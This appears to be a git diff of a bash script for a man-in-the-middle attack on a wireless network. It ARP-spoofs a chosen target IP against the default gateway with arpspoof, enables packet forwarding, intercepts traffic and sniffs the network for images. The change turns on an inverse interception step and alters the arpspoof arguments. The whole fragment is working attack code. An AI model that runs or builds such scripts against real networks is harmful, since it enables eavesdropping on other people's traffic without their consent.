@@ -42,7 +42,7 @@ function selectedTarget {
   trafficSelectedIp
   enablePacketFowarding
   interceptPackages
-  #inverseInterceptPackages
+  inverseInterceptPackages
   checkImages
   snifNetwork
 }
@@ -63,7 +63,7 @@ function trafficSelectedIp {
 
 function interceptPackages {
   printf " Intercepting pacakages\n\n"
-  xterm -e arpspoof -i wlan0 -t $targetIPAddress -r $defaultGateway &
+  xterm -e arpspoof -i wlan0 -t $targetIPAddress $defaultGateway &
 
 }
 
